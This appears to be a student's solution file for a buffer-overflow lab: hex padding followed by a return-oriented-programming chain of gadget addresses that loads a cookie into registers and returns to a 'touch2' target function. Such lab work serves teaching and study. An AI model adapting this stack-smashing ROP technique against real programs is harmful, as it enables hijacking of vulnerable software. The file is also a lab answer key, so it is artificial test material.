/* Padding */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00

/* USED GADGETS */

ef 19 40 00 00 00 00 00 	/* popq rax */
14 13 e2 16 00 00 00 00 	/* Argument-1 cookie for rdi */
f4 19 40 00 00 00 00 00 	/* movq rax rdx */
c4 19 40 00 00 00 00 00		/* movq rdx rsi */
a3 19 40 00 00 00 00 00		/* movq rsi rdi */

ef 19 40 00 00 00 00 00 	/* popq rax */
a7 13 e2 16 00 00 00 00		/* Argument-2 for rsi */
f4 19 40 00 00 00 00 00 	/* movq rax rdx */
c4 19 40 00 00 00 00 00		/* movq rdx rsi */

ef 19 40 00 00 00 00 00 	/* popq rax */
81 12 e2 16 00 00 00 00 	/* Argument-2 for rdx */
f4 19 40 00 00 00 00 00		/* movq rax rdx */

/* Return address touch2 */
71 16 40 00 00 00 00 00


